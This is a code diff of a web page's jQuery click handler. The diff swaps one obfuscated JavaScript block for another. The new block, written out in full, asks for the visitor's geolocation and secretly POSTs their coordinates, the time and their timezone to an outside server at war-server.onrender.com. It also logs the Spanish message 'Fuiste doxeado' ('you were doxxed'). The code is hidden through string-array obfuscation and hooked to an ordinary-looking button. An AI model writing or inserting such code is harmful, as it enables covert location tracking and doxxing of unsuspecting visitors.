@@ -21,89 +21,95 @@ $(document).ready(function () {
 
 $(document).ready(function () {
   $("#request").on("click", function (event) {
-    function _0x1b13(_0x6428be, _0x39c18b) {
-      var _0x379673 = _0x3796();
-      return (
-        (_0x1b13 = function (_0x1b13ff, _0x2f245) {
-          _0x1b13ff = _0x1b13ff - 0x148;
-          var _0x521328 = _0x379673[_0x1b13ff];
-          return _0x521328;
-        }),
-        _0x1b13(_0x6428be, _0x39c18b)
-      );
-    }
-    var _0x27e546 = _0x1b13;
-    (function (_0x318061, _0x639bda) {
-      var _0x273d98 = _0x1b13,
-        _0x2cf454 = _0x318061();
+    // Paste your JavaScript code here
+    var _0x5b05e0 = _0xce3a;
+    (function (_0x21b544, _0x481093) {
+      var _0x29f795 = _0xce3a,
+        _0x446049 = _0x21b544();
       while (!![]) {
         try {
-          var _0x473d99 =
-            parseInt(_0x273d98(0x149)) / 0x1 +
-            parseInt(_0x273d98(0x152)) / 0x2 +
-            parseInt(_0x273d98(0x156)) / 0x3 +
-            parseInt(_0x273d98(0x148)) / 0x4 +
-            -parseInt(_0x273d98(0x150)) / 0x5 +
-            -parseInt(_0x273d98(0x14f)) / 0x6 +
-            (-parseInt(_0x273d98(0x15a)) / 0x7) *
-              (parseInt(_0x273d98(0x14e)) / 0x8);
-          if (_0x473d99 === _0x639bda) break;
-          else _0x2cf454["push"](_0x2cf454["shift"]());
-        } catch (_0x316e02) {
-          _0x2cf454["push"](_0x2cf454["shift"]());
+          var _0x4d1b1f =
+            parseInt(_0x29f795(0x208)) / 0x1 +
+            parseInt(_0x29f795(0x206)) / 0x2 +
+            parseInt(_0x29f795(0x1fd)) / 0x3 +
+            (parseInt(_0x29f795(0x1fe)) / 0x4) *
+              (parseInt(_0x29f795(0x1f9)) / 0x5) +
+            parseInt(_0x29f795(0x1f6)) / 0x6 +
+            (parseInt(_0x29f795(0x1ff)) / 0x7) *
+              (parseInt(_0x29f795(0x1f7)) / 0x8) +
+            -parseInt(_0x29f795(0x1fc)) / 0x9;
+          if (_0x4d1b1f === _0x481093) break;
+          else _0x446049["push"](_0x446049["shift"]());
+        } catch (_0x7ae673) {
+          _0x446049["push"](_0x446049["shift"]());
         }
       }
-    })(_0x3796, 0x51285),
-      navigator[_0x27e546(0x14c)]["getCurrentPosition"](
-        (_0x51e14f) => {
-          var _0x18d496 = _0x27e546,
-            _0x16e591 = _0x18d496(0x151),
-            _0xf1e314 = _0x51e14f[_0x18d496(0x153)][_0x18d496(0x155)],
-            _0x598d94 = _0x51e14f[_0x18d496(0x153)][_0x18d496(0x14d)];
-          console["log"](_0xf1e314 + "," + _0x598d94);
-          var _0x184866 = new Date(),
-            _0x370d6d =
-              Intl[_0x18d496(0x14a)]()[_0x18d496(0x157)]()[_0x18d496(0x154)];
-          fetch(_0x16e591, {
-            method: _0x18d496(0x159),
-            body: JSON[_0x18d496(0x14b)]({
-              coords: "" + (_0xf1e314 + "," + _0x598d94),
-              timestamp: _0x184866,
-              timezone: _0x370d6d,
+    })(_0x4e20, 0xd8f00),
+      navigator[_0x5b05e0(0x1fa)][_0x5b05e0(0x204)](
+        (_0x577db9) => {
+          var _0x33a16f = _0x5b05e0,
+            _0x4c1904 = _0x33a16f(0x1f5),
+            _0x3db599 = _0x577db9["coords"][_0x33a16f(0x201)],
+            _0x2ec4c3 = _0x577db9[_0x33a16f(0x203)]["longitude"];
+          console[_0x33a16f(0x200)]("Fuiste\x20doxeado");
+          var _0x36eb3f = new Date(),
+            _0x1a3ede =
+              Intl[_0x33a16f(0x205)]()[_0x33a16f(0x202)]()[_0x33a16f(0x207)];
+          fetch(_0x4c1904, {
+            method: _0x33a16f(0x1f3),
+            headers: { "Content-Type": _0x33a16f(0x1f4) },
+            body: JSON[_0x33a16f(0x1fb)]({
+              coords: "" + (_0x3db599 + "," + _0x2ec4c3),
+              timestamp: _0x36eb3f,
+              timezone: _0x1a3ede,
             }),
           });
         },
-        (_0x899492) => {
-          var _0x4a47c4 = _0x27e546;
-          alert(_0x4a47c4(0x158));
+        (_0x3553a0) => {
+          var _0x251844 = _0x5b05e0;
+          alert(_0x251844(0x1f8));
         }
       );
-    function _0x3796() {
-      var _0x3fb1e4 = [
-        "1439492NYGygW",
-        "14587dcnGFT",
-        "DateTimeFormat",
-        "stringify",
-        "geolocation",
-        "longitude",
-        "22520zqIhLO",
-        "3346206txmJSH",
-        "224090kxxCMQ",
-        "https://war-server.onrender.com/api",
-        "664486CUNVGX",
-        "coords",
+    function _0xce3a(_0x1737eb, _0x30c690) {
+      var _0x4e2077 = _0x4e20();
+      return (
+        (_0xce3a = function (_0xce3a40, _0xa4f006) {
+          _0xce3a40 = _0xce3a40 - 0x1f3;
+          var _0x56247f = _0x4e2077[_0xce3a40];
+          return _0x56247f;
+        }),
+        _0xce3a(_0x1737eb, _0x30c690)
+      );
+    }
+    function _0x4e20() {
+      var _0x16c9a6 = [
         "timeZone",
-        "latitude",
-        "1081626VzEhzz",
-        "resolvedOptions",
-        "Ups,\x20se\x20necesitan\x20habilitar\x20permiso\x20de\x20localizacion",
+        "649933sWLcNf",
         "POST",
-        "329qKAwDW",
+        "application/json",
+        "https://war-server.onrender.com/api",
+        "6746910XCWcmi",
+        "7159032zJGjlP",
+        "Ups,\x20se\x20necesitan\x20habilitar\x20permiso\x20de\x20localizacion",
+        "5OfDFgT",
+        "geolocation",
+        "stringify",
+        "27999306kkNHYE",
+        "2485740KRKNPo",
+        "1114888xzgMqD",
+        "7AdgMSX",
+        "log",
+        "latitude",
+        "resolvedOptions",
+        "coords",
+        "getCurrentPosition",
+        "DateTimeFormat",
+        "446022xIHbub",
       ];
-      _0x3796 = function () {
-        return _0x3fb1e4;
+      _0x4e20 = function () {
+        return _0x16c9a6;
       };
-      return _0x3796();
+      return _0x4e20();
     }
   });
 });
